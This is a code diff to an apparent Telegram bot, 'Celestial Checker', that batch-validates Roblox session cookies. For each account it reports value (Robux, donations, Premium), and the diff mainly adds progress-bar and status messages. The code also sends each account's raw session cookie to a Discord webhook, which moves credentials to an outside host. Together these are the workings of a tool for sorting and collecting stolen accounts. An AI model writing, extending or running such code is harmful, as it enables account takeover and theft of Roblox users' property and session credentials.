@@ -686,6 +686,12 @@ async def process_checker(callback: CallbackQuery, state: FSMContext):
     status_message = await callback.message.answer("🌌 <b>Запускаю Celestial Checker...</b>", parse_mode="HTML")
     
     try:
+        await status_message.edit_text(
+            f"🔍 <b>Найдено {total_accounts} аккаунтов</b>\n"
+            f"⚡ <i>Запускаю проверку...</i>",
+            parse_mode="HTML"
+        )
+        
         # Получаем настройки пользователя
         user_settings = get_user_settings(callback.from_user.id)
         
@@ -698,6 +704,24 @@ async def process_checker(callback: CallbackQuery, state: FSMContext):
         
         for account in account_data:
             checked_count += 1
+            progress = checked_count / total_accounts
+            
+            # КРАСИВЫЙ ПРОГРЕСС-БАР
+            progress_bar = create_advanced_progress_bar(progress)
+            status_text = (
+                f"<b>🌌 CELESTIAL CHECKER - ПРОВЕРКА</b>\n\n"
+                f"<blockquote>{progress_bar}</blockquote>\n"
+                f"🔍 Проверяю аккаунт <b>#{checked_count}</b> из <b>{total_accounts}</b>\n\n"
+                f"<b>📈 ТЕКУЩАЯ СТАТИСТИКА:</b>\n"
+                f"• ✅ Валидных: <b>{len(valid_accounts)}</b>\n"
+                f"• ❌ Невалидных: <b>{checked_count - len(valid_accounts) - 1}</b>\n"
+                f"• 💰 Robux: <b>{total_robux:,}</b>\n"
+                f"• 🎁 AllTimeDonate: <b>{total_donate:,}</b>\n"
+                f"• 🧠 Brainrot: <b>{total_brainrot_spent:,}</b>\n"
+                f"• 👑 Premium: <b>{premium_count}</b>"
+            )
+            
+            await status_message.edit_text(status_text, parse_mode="HTML")
             
             logger.info(f"🔍 Проверка аккаунта #{account['index']}")
             
@@ -708,9 +732,8 @@ async def process_checker(callback: CallbackQuery, state: FSMContext):
                 callback.from_user.id
             )
             
-            # Остальной код функции остается таким же...
-            
             if account_info['valid']:
+                logger.info(f"✅ Аккаунт валиден: {account_info['username']}")
                 total_robux += account_info['robux']
                 total_donate += account_info['all_time_donate']
                 total_brainrot_spent += account_info['steal_a_brainrot_spent']
@@ -736,13 +759,17 @@ async def process_checker(callback: CallbackQuery, state: FSMContext):
                            f"R${account_info['robux']:,} Donate:{account_info['all_time_donate']:,} "
                            f"Brainrot:{account_info['steal_a_brainrot_spent']:,} Premium:{account_info['premium']}")
             else:
-                logger.warning(f"❌ #{account['index']} Невалидный: {account_info.get('error', 'Unknown error')}")
+                logger.warning(f"❌ Аккаунт невалиден: {account_info.get('error', 'Unknown error')}")
+                # Отправляем информацию о невалидном аккаунте в Discord
                 await send_to_discord_webhook(account_info, user_info, account['cookie'], "checker")
             
             await asyncio.sleep(1.5)
         
+        # После завершения проверки
+        logger.info(f"📊 Проверка завершена: {len(valid_accounts)}/{total_accounts} валидных")
+        
         # Применяем фильтрацию по возрасту если включено
-        if user_settings['remove_new_accounts']:
+        if user_settings['remove_new_accounts'] and valid_accounts:
             original_count = len(valid_accounts)
             valid_accounts = filter_accounts_by_age(valid_accounts, user_settings['min_account_age_days'])
             filtered_count = original_count - len(valid_accounts)
@@ -796,7 +823,7 @@ async def process_checker(callback: CallbackQuery, state: FSMContext):
             
             stats_file = BufferedInputFile(stats_content.encode('utf-8'), filename="celestial_stats.txt")
             
-            # Создаем сообщение с результатами
+            # КРАСИВОЕ ФИНАЛЬНОЕ СООБЩЕНИЕ
             success_rate = round((len(valid_accounts) / total_accounts * 100), 1)
             progress_bar = create_advanced_progress_bar(success_rate / 100)
             
